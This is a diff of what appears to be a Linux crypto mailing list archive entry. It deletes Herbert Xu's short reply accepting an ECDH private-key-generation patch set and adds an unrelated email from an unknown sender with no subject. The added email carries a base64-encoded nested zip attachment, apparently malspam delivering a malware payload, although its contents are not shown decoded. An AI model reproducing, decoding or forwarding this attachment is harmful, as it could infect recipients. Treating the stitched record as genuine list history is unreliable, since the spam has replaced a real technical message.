@@ -1,50 +1,55 @@
-From: Herbert Xu <herbert@gondor.apana.org.au>
-Subject: Re: [PATCH v3 0/2] crypto: ecdh - add privkey generation support
-Date: Sat, 10 Jun 2017 12:18:52 +0800
-Message-ID: <20170610041852.GJ14719@gondor.apana.org.au>
-References: <1496155969-13765-1-git-send-email-tudor.ambarus@microchip.com>
+From: <agiva@centrum.cz>
+Subject: (unknown)
+Date: Sat, 10 Jun 2017 05:29:15 -0000
+Message-ID: <149707255553.19457.7118669435808385265@fastwebnet.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: davem@davemloft.net, linux-crypto@vger.kernel.org,
-        smueller@chronox.de, marcel@holtmann.org,
-        Nicolas.Ferre@microchip.com
-To: Tudor Ambarus <tudor.ambarus@microchip.com>
+Content-Type: application/zip; name="32156204782.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from orcrist.hmeau.com ([104.223.48.154]:53040 "EHLO
-        deadmen.hmeau.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751943AbdFJE7V (ORCPT
-        <rfc822;linux-crypto@vger.kernel.org>);
-        Sat, 10 Jun 2017 00:59:21 -0400
-Content-Disposition: inline
-In-Reply-To: <1496155969-13765-1-git-send-email-tudor.ambarus@microchip.com>
+Received: from 2-229-9-104.ip194.fastwebnet.it ([2.229.9.104]:60701 "HELO
+        fastwebnet.it" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750945AbdFJF3T (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Sat, 10 Jun 2017 01:29:19 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-On Tue, May 30, 2017 at 05:52:47PM +0300, Tudor Ambarus wrote:
-> Hi,
-> 
-> This patch set adds support for generating ecc private keys.
-> ecc private keys are generated using the method of extra random bits,
-> equivalent to that described in FIPS 186-4, Appendix B.4.1.
-> 
-> Generation of ecc private keys is helpful in a user-space to kernel
-> ecdh offload because the keys are not revealed to user-space.
-> 
-> Private key generation is also helpful to implement forward secrecy.
-> A public/private key system demonstrates the property of forward secrecy
-> if it creates new key pairs for each communication session. These key pairs
-> are generated on an as-needed basis and are destroyed after the session
-> is over. If an attacker were to record previous encrypted session data,
-> they wouldn't be able to decrypt it with possession of a long-term key.
-> 
-> There are crypto accelerators that are capable of generating and retaining
-> ecdh private keys without revealing them to software. This patch set is a
-> prerequisite for hardware ecdh with private key generation support.
-> 
-> Changes in v3:
-
-All applied.  Thanks.
--- 
-Email: Herbert Xu <herbert@gondor.apana.org.au>
-Home Page: http://gondor.apana.org.au/~herbert/
-PGP Key: http://gondor.apana.org.au/~herbert/pubkey.txt
+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
+AAA=
